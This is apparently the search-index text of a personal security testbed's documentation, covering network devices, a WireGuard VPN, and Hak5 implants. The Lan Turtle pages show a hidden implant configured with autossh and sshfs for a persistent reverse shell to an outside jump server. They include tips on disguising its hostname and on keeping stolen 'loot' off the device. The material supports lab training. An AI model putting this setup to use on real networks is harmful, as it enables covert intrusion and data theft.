6.3.1.19, B1.0.0.4 Password: password IP Address: 192.168.89.2 Lap01 \u00b6 The intent is to configure a series of virtual machines on this laptop that will serve as software targets for various purposes. At this point, it is a base system with the standard Ubuntu version of KVM installed. The machine is a used HP Z-Book that is approximately 6 years old. Configuration \u00b6 OS: Ubuntu 20.04 LTS Hostname: capture01 Username: argodev Password: standard lab password CPU: 8 cores RAM: 24 GB IP Address: 192.168.89.3 (DHCP Reservation) Lap02 \u00b6 The intent is to configure a series of virtual machines on this laptop that will serve as software targets for various purposes. At this point, it is a base system with the standard Ubuntu version of KVM installed. The machine is a used HP Z-Book that is approximately 6 years old. Configuration \u00b6 OS: Ubuntu 20.04 LTS Hostname: capture02 Username: argodev Password: standard lab password CPU: 8 cores RAM: 24 GB IP Address: 192.168.89.4 (DHCP Reservation) Network Space \u00b6 As detailed above within the configuration blocks for each device, the network is fairly straight-forward. The R7000 is configured as a DHCP server with a number of static reservations Devices: \u00b6 router: 192.168.89.1 switch: 192.168.89.2 lap01: 192.168.89.3 lap02: 192.168.89.2 Wireless Network \u00b6 There exists two wireless networks configured that allow access to the testbed network. The only difference between the two is the RF band (2.4 GHz vs. 5 GHz). Configuration \u00b6 2.4 GHz ssid: CAUTION_HEAVY_2 5.0 GHz ssid: CAUTION_HEAVY_5 Password: standard lab password Jump Server \u00b6 In order to make some of the attacks in this environment a little more controlled, I configured a publicly-accessible jump server. This is simply a \"droplet\" (small virtual private server) hosted by Digital Ocean . I selected one of the smallest devices (~$6/mo). It is mapped to a domain that I own and is reachable at george.bitpredator.com . It is only accessible via ssh and requires pub/priv key authentication (no passwords allowed). Configuration \u00b6 RAM: 1 GB CPU: 1 Intel vCPU HDD: 25 GB Location: NYC1","title":"Portable Testbed"},{"location":"testbed/index.html#portable-testbed","text":"While many things can (and should) be virtualized, I wanted to build a small testbed wherein I could validate not only my logical access to various things, but also confirm some physical attacks/interactions. Additionally, this will allow others in my team to participate and train once I get a few of the kinks worked out. This section of the documentation describes the environment and some of the uses.","title":"Portable Testbed"},{"location":"testbed/index.html#testbed-layout","text":"","title":"Testbed Layout"},{"location":"testbed/index.html#router","text":"The network router in the testbed is an used Netgear Nighthawk R7000 . The extnernal/WAN interface is intended to be connected to whatever local network you are working on and the router should provide a reasonable level of isolation between your LAN and the possibly vulnerable machines inside the testbed.","title":"Router"},{"location":"testbed/index.html#configuration","text":"Firmware Version: V1.0.11.106_10.2.100 Username: admin Password: standard lab password Internal IP: 192.168.89.1","title":"Configuration"},{"location":"testbed/index.html#switch","text":"We decided to use a Netgear GS724T 24-Port switch as the primary backbone for the testbed. We had one available and it allows us to, should we choose, configure a span port for traffic monitoring.","title":"Switch"},{"location":"testbed/index.html#configuration_1","text":"Firmware Version: 6.3.1.19, B1.0.0.4 Password: password IP Address: 192.168.89.2","title":"Configuration"},{"location":"testbed/index.html#lap01","text":"The intent is to configure a series of virtual machines on this laptop that will serve as software targets for various purposes. At this point, it is a base system with the standard Ubuntu version of KVM installed. The machine is a used HP Z-Book that is approximately 6 years old.","title":"Lap01"},{"location":"testbed/index.html#configuration_2","text":"OS: Ubuntu 20.04 LTS Hostname: capture01 Username: argodev Password: standard lab password CPU: 8 cores RAM: 24 GB IP Address: 192.168.89.3 (DHCP Reservation)","title":"Configuration"},{"location":"testbed/index.html#lap02","text":"The intent is to configure a series of virtual machines on this laptop that will serve as software targets for various purposes. At this point, it is a base system with the standard Ubuntu version of KVM installed. The machine is a used HP Z-Book that is approximately 6 years old.","title":"Lap02"},{"location":"testbed/index.html#configuration_3","text":"OS: Ubuntu 20.04 LTS Hostname: capture02 Username: argodev Password: standard lab password CPU: 8 cores RAM: 24 GB IP Address: 192.168.89.4 (DHCP Reservation)","title":"Configuration"},{"location":"testbed/index.html#network-space","text":"As detailed above within the configuration blocks for each device, the network is fairly straight-forward. The R7000 is configured as a DHCP server with a number of static reservations","title":"Network Space"},{"location":"testbed/index.html#devices","text":"router: 192.168.89.1 switch: 192.168.89.2 lap01: 192.168.89.3 lap02: 192.168.89.2","title":"Devices:"},{"location":"testbed/index.html#wireless-network","text":"There exists two wireless networks configured that allow access to the testbed network. The only difference between the two is the RF band (2.4 GHz vs. 5 GHz).","title":"Wireless Network"},{"location":"testbed/index.html#configuration_4","text":"2.4 GHz ssid: CAUTION_HEAVY_2 5.0 GHz ssid: CAUTION_HEAVY_5 Password: standard lab password","title":"Configuration"},{"location":"testbed/index.html#jump-server","text":"In order to make some of the attacks in this environment a little more controlled, I configured a publicly-accessible jump server. This is simply a \"droplet\" (small virtual private server) hosted by Digital Ocean . I selected one of the smallest devices (~$6/mo). It is mapped to a domain that I own and is reachable at george.bitpredator.com . It is only accessible via ssh and requires pub/priv key authentication (no passwords allowed).","title":"Jump Server"},{"location":"testbed/index.html#configuration_5","text":"RAM: 1 GB CPU: 1 Intel vCPU HDD: 25 GB Location: NYC1","title":"Configuration"},{"location":"testbed/lanturtle.html","text":"Lan Turtle \u00b6 To represent a physical implant that provides persistent remote access, we selected the Lan Turtle by Hak5 . This device is designed to look like a USB Ethernet adapter (or a USB-to-Ethernet KVM) but is really an embedded Linux system that can provide a number of simple capabilities. The unit we had also contained the 3G modem, but we elected not to use it for this setup. Configuration \u00b6 In theory, updating the device to the latest firmware should be easy and straight-forward. It isn't... at least not for me, and a number of others who (helpfully) posted their struggles online. You should be able to use the turtle command, enter the configuration menu, check for updates, apply, reboot, and be golden. The problem I faced, however, was that when I did this, I ended up with a device that would no longer pull modules, check for updates, anything. After much debugging and gnashing of teeth, it became clear that the issue was that the date/time on the device was out of sync, and therefore SSL validation would fail. Some suggested simply disabling SSL cert validation, but this seems unwise on a security-focused device. Making things further frustrating, I learned that AT&T blocks NTP packets due to network threats, so the configured-by-default NTP client on the turtle fails to obtain an updated time value. What I ended up figuring out, is as follows: # ssh into the turtle, exit the configuration utility # and end up at the shell # update the software listing $ opkg update # install a non-NTP-based time update utility $ opkg install htpdate # force the time to be updated (using the webserver at 1.1.1.1; # could be really any valid site) $ htpdate -s 1 .1.1.1 Once this is done, it is not a bad idea to add this last command ( htpdate -s 1.1.1.1 ) into /etc/rc.local so it gets executed on each system start. Warning It might make most sense to change this to daemon mode so it runs all the time htpdate -D 1.1.1.1 After following all of these steps, I was able to successfully update the device to firmware version 6.2-stable . For reference, additional firmware files and details are available here: https://downloads.hak5.org/turtle . Another general configuration step to assist with the stealthy-ness of the activities, is to edit /etc/config/system and change the hostname to something other than turtle . Making it something less obvious may help hide it longer (e.g. usbeth0 ). Additionally, I deployed the ssh public key from my attacker machine to the turtle to make subsequent logins easier. ssh-copy-id -i ~/.ssh/id_rsa.pub root@172.16.84.1 The next configuration activities included installing and configuring the modules. Modules \u00b6 From within the turtle shell, you can choose Modules and then select the modulemanager module. The start and enable functions do not really apply for this module, but Configure does. From the configuration manager, you choose to update the directory, agree to connect to lanturtle.com and then browse/select the modules you'd like to install. For this instance, I chose to keep things simple and just installed the following: autossh , keymanager , and sshfs . Once these have been installed, you can step back a few screens to the main Modules window where you will see and be able to configure the installed modules. KeyManager \u00b6 This module is another that you simply configure, and the only thing I needed to do here was the generate_key command. This is just a UI-wrapper on ssh-keygen . Once this is done, I needed to transfer the public key ( /.ssh/id_rsa.pub ) to the account on the cloud-hosted jump server. Note On the jump server, I had previously configured an account ( turtle ) that would be used by this device. Additionally, if the jump server allowed password-based SSH connections, the KeyManager module would have allowed me to deploy my key directly. However, since I am only allowing keys, I have to shuffle it through another account and cannot use the automated scripts. AutoSSH \u00b6 The autossh module maintains persistent SSH shells to another server and can forward local ports to the remote server for the purpose of enabling reverse tunnling through the established shell. This is a more normal module, so we begin by configuring it: user@host: turtle@george.bitpredator.com Port: 22 Remote Port: 2222 Local Port: 22 The last two lines expose port 22 on the turtle's local network interface to port 2222 on the host it is going to tunnel to (in this case, george.bitpredator.com ). We submit these settings and then select enable to have it start each time the device boots up, and finally we click start to get it up and running. Warning In prior versions, the instructions up to this point would have worked just fine. However, the last start command now fails because my jump server host is not in the known_hosts file. In an effort to be maybe a little too smart, this is now bundled into the copy_key configuration option of the keymanager module, which won't work for me because of my password-less restriction on the jump server. I simply exited to the shell, manually established an SSH connection to my jump server which caused bash to prompt me to update authorized_keys . This being done (and confirming that the connection worked), I was able to return to the turtle shell ( turtle ) and start this module. SSHFS \u00b6 The last module to configure is sshfs . This simply mounts a remote file system as if it were local. In this case, it allows us to expand the rather meager storage of the turtle to whatever amount of disk is available in my jump server. The configuration of this module is rather simple: Host: george.bitpredator.com Port: 22 User: turtle Path: /home/turtle This will map the local /sshfs directory on the turtle to the /home/turtle directory on the jump server. Now we submit the configuration, enable it, and then start it. Deployment \u00b6 In the testbed, the turtle is plugged into a USB port on Lap01 for the purposes of providing power. It could theoretically also provide some MITM capabilities for this machine, but we are not using them. The ethernet jack is connected directly to the primary switch and it serves as a remotely-accesible beachhead. Turtle Layout Deployed LanTurtle Use \u00b6 With the device configured and deployed into the test bed, it will provide me a remotely-accessible shell any time I need it. The following demonstrates its use: # Connect from my attacker machine to my jump server $ ssh root@george.bitpredator.com # copy my local ssh key (on jump server) to turtle $ ssh-copy-id -i .ssh/id_rsa.pub root@localhost -p 2222 # Connect via the reverse ssh tunnel into the turtle/target env $ ssh root@localhost -p 2222 # write files to turtle's \"local\" storage, remapped to jump server $ touch /sshfs/bubb02 Tip One key feature of using sshfs on the turtle as the storage location for \"loot\", is that if the device happens to be found and/ore disconnected by a local user/network admin, anything that you had gathered will not actually reside on the turtle, but instead on the drive of the jump server which remains in your control","title":"Lan Turtle"},{"location":"testbed/lanturtle.html#lan-turtle","text":"To represent a physical implant that provides persistent remote access, we selected the Lan Turtle by Hak5 . This device is designed to look like a USB Ethernet adapter (or a USB-to-Ethernet KVM) but is really an embedded Linux system that can provide a number of simple capabilities. The unit we had also contained the 3G modem, but we elected not to use it for this setup.","title":"Lan Turtle"},{"location":"testbed/lanturtle.html#configuration","text":"In theory, updating the device to the latest firmware should be easy and straight-forward. It isn't... at least not for me, and a number of others who (helpfully) posted their struggles online. You should be able to use the turtle command, enter the configuration menu, check for updates, apply, reboot, and be golden. The problem I faced, however, was that when I did this, I ended up with a device that would no longer pull modules, check for updates, anything. After much debugging and gnashing of teeth, it became clear that the issue was that the date/time on the device was out of sync, and therefore SSL validation would fail. Some suggested simply disabling SSL cert validation, but this seems unwise on a security-focused device. Making things further frustrating, I learned that AT&T blocks NTP packets due to network threats, so the configured-by-default NTP client on the turtle fails to obtain an updated time value. What I ended up figuring out, is as follows: # ssh into the turtle, exit the configuration utility # and end up at the shell # update the software listing $ opkg update # install a non-NTP-based time update utility $ opkg install htpdate # force the time to be updated (using the webserver at 1.1.1.1; # could be really any valid site) $ htpdate -s 1 .1.1.1 Once this is done, it is not a bad idea to add this last command ( htpdate -s 1.1.1.1 ) into /etc/rc.local so it gets executed on each system start. Warning It might make most sense to change this to daemon mode so it runs all the time htpdate -D 1.1.1.1 After following all of these steps, I was able to successfully update the device to firmware version 6.2-stable . For reference, additional firmware files and details are available here: https://downloads.hak5.org/turtle . Another general configuration step to assist with the stealthy-ness of the activities, is to edit /etc/config/system and change the hostname to something other than turtle . Making it something less obvious may help hide it longer (e.g. usbeth0 ). Additionally, I deployed the ssh public key from my attacker machine to the turtle to make subsequent logins easier. ssh-copy-id -i ~/.ssh/id_rsa.pub root@172.16.84.1 The next configuration activities included installing and configuring the modules.","title":"Configuration"},{"location":"testbed/lanturtle.html#modules","text":"From within the turtle shell, you can choose Modules and then select the modulemanager module. The start and enable functions do not really apply for this module, but Configure does. From the configuration manager, you choose to update the directory, agree to connect to lanturtle.com and then browse/select the modules you'd like to install. For this instance, I chose to keep things simple and just installed the following: autossh , keymanager , and sshfs . Once these have been installed, you can step back a few screens to the main Modules window where you will see and be able to configure the installed modules.","title":"Modules"},{"location":"testbed/lanturtle.html#keymanager","text":"This module is another that you simply configure, and the only thing I needed to do here was the generate_key command. This is just a UI-wrapper on ssh-keygen . Once this is done, I needed to transfer the public key ( /.ssh/id_rsa.pub ) to the account on the cloud-hosted jump server. Note On the jump server, I had previously configured an account ( turtle ) that would be used by this device. Additionally, if the jump server allowed password-based SSH connections, the KeyManager module would have allowed me to deploy my key directly. However, since I am only allowing keys, I have to shuffle it through another account and cannot use the automated scripts.","title":"KeyManager"},{"location":"testbed/lanturtle.html#autossh","text":"The autossh module maintains persistent SSH shells to another server and can forward local ports to the remote server for the purpose of enabling reverse tunnling through the established shell. This is a more normal module, so we begin by configuring it: user@host: turtle@george.bitpredator.com Port: 22 Remote Port: 2222 Local Port: 22 The last two lines expose port 22 on the turtle's local network interface to port 2222 on the host it is going to tunnel to (in this case, george.bitpredator.com ). We submit these settings and then select enable to have it start each time the device boots up, and finally we click start to get it up and running. Warning In prior versions, the instructions up to this point would have worked just fine. However, the last start command now fails because my jump server host is not in the known_hosts file. In an effort to be maybe a little too smart, this is now bundled into the copy_key configuration option of the keymanager module, which won't work for me because of my password-less restriction on the jump server. I simply exited to the shell, manually established an SSH connection to my jump server which caused bash to prompt me to update authorized_keys . This being done (and confirming that the connection worked), I was able to return to the turtle shell ( turtle ) and start this module.","title":"AutoSSH"},{"location":"testbed/lanturtle.html#sshfs","text":"The last module to configure is sshfs . This simply mounts a remote file system as if it were local. In this case, it allows us to expand the rather meager storage of the turtle to whatever amount of disk is available in my jump server. The configuration of this module is rather simple: Host: george.bitpredator.com Port: 22 User: turtle Path: /home/turtle This will map the local /sshfs directory on the turtle to the /home/turtle directory on the jump server. Now we submit the configuration, enable it, and then start it.","title":"SSHFS"},{"location":"testbed/lanturtle.html#deployment","text":"In the testbed, the turtle is plugged into a USB port on Lap01 for the purposes of providing power. It could theoretically also provide some MITM capabilities for this machine, but we are not using them. The ethernet jack is connected directly to the primary switch and it serves as a remotely-accesible beachhead. Turtle Layout Deployed LanTurtle","title":"Deployment"},{"location":"testbed/lanturtle.html#use","text":"With the device configured and deployed into the test bed, it will provide me a remotely-accessible shell any time I need it. The following demonstrates its use: # Connect from my attacker machine to my jump server $ ssh root@george.bitpredator.com # copy my local ssh key (on jump server) to turtle $ ssh-copy-id -i .ssh/id_rsa.pub root@localhost -p 2222 # Connect via the reverse ssh tunnel into the turtle/target env $ ssh root@localhost -p 2222 # write files to turtle's \"local\" storage, remapped to jump server $ touch /sshfs/bubb02 Tip One key feature of using sshfs on the turtle as the storage location for \"loot\", is that if the device happens to be found and/ore disconnected by a local user/network admin, anything that you had gathered will not actually reside on the turtle, but instead on the drive of the jump server which remains in your control","title":"Use"},{"location":"testbed/pktsquirrel.html","text":"Packet Squirrel \u00b6 The Packet Squirrel by Hak5 is a simple hardware implant that can be used to run a handful of different payloads in a man-in-the-middle (MITM) style deployment. It is designed to be small and to hide in many deployment locations. While it can do quite a bit, in our scenario, we simply configured it for the first/default payload: packet capture. When deployed, it simply creates a pcap of all data going through it and this data is written to a connected USB stick. Deployment \u00b6 As deployed in our testbed, it is connected in between the link from the switch to the router, effectively letting it see all inbound/outbound traffic. It cannot see traffic only between hosts on the network (not connected to a span port). Squirrel Layout Deployed Packet Squirrel Warning One negative when deploying this is that it has a max interface speed of 100 Mbps. On an IT network, this is likely obvious - the switch light goes orange on our test bed router. However, in an OT network, most of the devices only run at 10/100, and therefore it is likely not an issue.","title":"Packet Squirrel"},{"location":"testbed/pktsquirrel.html#packet-squirrel","text":"The Packet Squirrel by Hak5 is a simple hardware implant that can be used to run a handful of different payloads in a man-in-the-middle (MITM) style deployment. It is designed to be small and to hide in many deployment locations. While it can do quite a bit, in our scenario, we simply configured it for the first/default payload: packet capture. When deployed, it simply creates a pcap of all data going through it and this data is written to a connected USB stick.","title":"Packet Squirrel"},{"location":"testbed/pktsquirrel.html#deployment","text":"As deployed in our testbed, it is connected in between the link from the switch to the router, effectively letting it see all inbound/outbound traffic. It cannot see traffic only between hosts on the network (not connected to a span port). Squirrel Layout Deployed Packet Squirrel Warning One negative when deploying this is that it has a max interface speed of 100 Mbps. On an IT network, this is likely obvious - the switch light goes orange on our test bed router. However, in an OT network, most of the devices only run at 10/100, and therefore it is likely not an issue.","title":"Deployment"},{"location":"testbed/virtual_machines.html","text":"Virtual Machine Hosting \u00b6 https://multipass.run/?_ga=2.43658912.46093267.1634159922-1151862409.1634159922 https://multipass.run/docs/using-libvirt","title":"Virtual Machine Hosting"},{"location":"testbed/virtual_machines.html#virtual-machine-hosting","text":"https://multipass.run/?_ga=2.43658912.46093267.1634159922-1151862409.1634159922 https://multipass.run/docs/using-libvirt","title":"Virtual Machine Hosting"},{"location":"testbed/vpn.html","text":"VPN \u00b6 In order to make testing and other work both easier and protected, we establish a simple VPN that is allowed to transit the network. While there are many approaches that could have been used, we elected to utilize wireguard. The \"server\" is lap0 and it listens on port 51820 . These are the steps taken to configure the environment On the server ( lap01 ) \u00b6 Install the software $ sudo apt install wireguard Create private/public keys for the server $ wg genkey | tee privatekey | wg pubkey > publickey Create tunnel interface definition file in /etc/wireguard/wg0.conf [Interface] PrivateKey=**REDACTED** Address=192.168.88.1/24 SaveConfig=true PostUp=iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE; PostDown=iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o enp0s25 -j MASQUERADE; ListenPort=51820 Bring the interface up $ wg-quick up wg0 [ #] ip link add wg0 type wireguard [ #] wg setconf wg0 /dev/fd/63 [ #] ip -4 address add 192.168.90.1/24 dev wg0 [ #] ip link set mtu 1420 up dev wg0 [ #] iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE; Confirm it is up/running $ sudo wg interface: wg0 public key: 5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw = private key: ( hidden ) listening port: 51820 On the client \u00b6 Install the software $ sudo apt install wireguard Create private/public keys for the clien $ wg genkey | tee privatekey | wg pubkey > publickey Create tunnel interface defintion file in /etc/wireguard/wg0.conf [Interface] PrivateKey=**REDACTED** Address=192.168.88.2/24 SaveConfig=true [Peer] PublicKey=5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw= Endpoint=192.168.20.241:51820 AllowedIPs=192.168.88.0/23 PersistentKeepalive=30 Bring the interface up $ wg-quick up wg0 [ #] ip link add wg0 type wireguard [ #] wg setconf wg0 /dev/fd/63 [ #] ip -4 address add 192.168.88.2/24 dev wg0 [ #] ip link set mtu 1420 up dev wg0 [ #] ip -4 route add 192.168.88.0/23 dev wg0 Confirm it is working sudo wg interface: wg0 public key: Tiqe/+WzNOSv6zCYFzKfuKW45guhN5e9VkoOn9zEPyc = private key: ( hidden ) listening port: 55015 peer: 5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw = endpoint: 192 .168.20.241:51820 allowed ips: 192 .168.88.0/23 It is created, but not yet connected to the server Back on the Server \u00b6 Configure to allow the client to make a connection # sudo wg set wg0 peer [client_pub_key] allowed-ips [client_tunnel_ip]/32 $ sudo wg set wg0 peer Tiqe/+WzNOSv6zCYFzKfuKW45guhN5e9VkoOn9zEPyc = allowed-ips 192 .168.88.2/32 \\ # configure to auto-restart this interface on reboot $ sudo systemctl enable --now wg-quick@wg0.service Back on the Client \u00b6 Confirm everything is working as it should be: $ sudo wg interface: wg0 public key: Tiqe/+WzNOSv6zCYFzKfuKW45guhN5e9VkoOn9zEPyc = private key: ( hidden ) listening port: 55015 peer: 5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw = endpoint: 192 .168.20.241:51820 allowed ips: 192 .168.88.0/23 latest handshake: 1 second ago transfer: 1 .79 KiB received, 2 .96 KiB sent persistent keepalive: every 30 seconds And I can now successfully ping boxes within the test environment","title":"VPN"},{"location":"testbed/vpn.html#vpn","text":"In order to make testing and other work both easier and protected, we establish a simple VPN that is allowed to transit the network. While there are many approaches that could have been used, we elected to utilize wireguard. The \"server\" is lap0 and it listens on port 51820 . These are the steps taken to configure the environment","title":"VPN"},{"location":"testbed/vpn.html#on-the-server-lap01","text":"Install the software $ sudo apt install wireguard Create private/public keys for the server $ wg genkey | tee privatekey | wg pubkey > publickey Create tunnel interface definition file in /etc/wireguard/wg0.conf [Interface] PrivateKey=**REDACTED** Address=192.168.88.1/24 SaveConfig=true PostUp=iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE; PostDown=iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o enp0s25 -j MASQUERADE; ListenPort=51820 Bring the interface up $ wg-quick up wg0 [ #] ip link add wg0 type wireguard [ #] wg setconf wg0 /dev/fd/63 [ #] ip -4 address add 192.168.90.1/24 dev wg0 [ #] ip link set mtu 1420 up dev wg0 [ #] iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o enp0s25 -j MASQUERADE; Confirm it is up/running $ sudo wg interface: wg0 public key: 5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw = private key: ( hidden ) listening port: 51820","title":"On the server (lap01)"},{"location":"testbed/vpn.html#on-the-client","text":"Install the software $ sudo apt install wireguard Create private/public keys for the clien $ wg genkey | tee privatekey | wg pubkey > publickey Create tunnel interface defintion file in /etc/wireguard/wg0.conf [Interface] PrivateKey=**REDACTED** Address=192.168.88.2/24 SaveConfig=true [Peer] PublicKey=5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw= Endpoint=192.168.20.241:51820 AllowedIPs=192.168.88.0/23 PersistentKeepalive=30 Bring the interface up $ wg-quick up wg0 [ #] ip link add wg0 type wireguard [ #] wg setconf wg0 /dev/fd/63 [ #] ip -4 address add 192.168.88.2/24 dev wg0 [ #] ip link set mtu 1420 up dev wg0 [ #] ip -4 route add 192.168.88.0/23 dev wg0 Confirm it is working sudo wg interface: wg0 public key: Tiqe/+WzNOSv6zCYFzKfuKW45guhN5e9VkoOn9zEPyc = private key: ( hidden ) listening port: 55015 peer: 5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw = endpoint: 192 .168.20.241:51820 allowed ips: 192 .168.88.0/23 It is created, but not yet connected to the server","title":"On the client"},{"location":"testbed/vpn.html#back-on-the-server","text":"Configure to allow the client to make a connection # sudo wg set wg0 peer [client_pub_key] allowed-ips [client_tunnel_ip]/32 $ sudo wg set wg0 peer Tiqe/+WzNOSv6zCYFzKfuKW45guhN5e9VkoOn9zEPyc = allowed-ips 192 .168.88.2/32 \\ # configure to auto-restart this interface on reboot $ sudo systemctl enable --now wg-quick@wg0.service","title":"Back on the Server"},{"location":"testbed/vpn.html#back-on-the-client","text":"Confirm everything is working as it should be: $ sudo wg interface: wg0 public key: Tiqe/+WzNOSv6zCYFzKfuKW45guhN5e9VkoOn9zEPyc = private key: ( hidden ) listening port: 55015 peer: 5oAPZBxgOx3TCR/sNhzq0kFnN7gRr6Wr0GKQxZ1sxDw = endpoint: 192 .168.20.241:51820 allowed ips: 192 .168.88.0/23 latest handshake: 1 second ago transfer: 1 .79 KiB received, 2 .96 KiB sent persistent keepalive: every 30 seconds And I can now successfully ping boxes within the test environment","title":"Back on the Client"}]}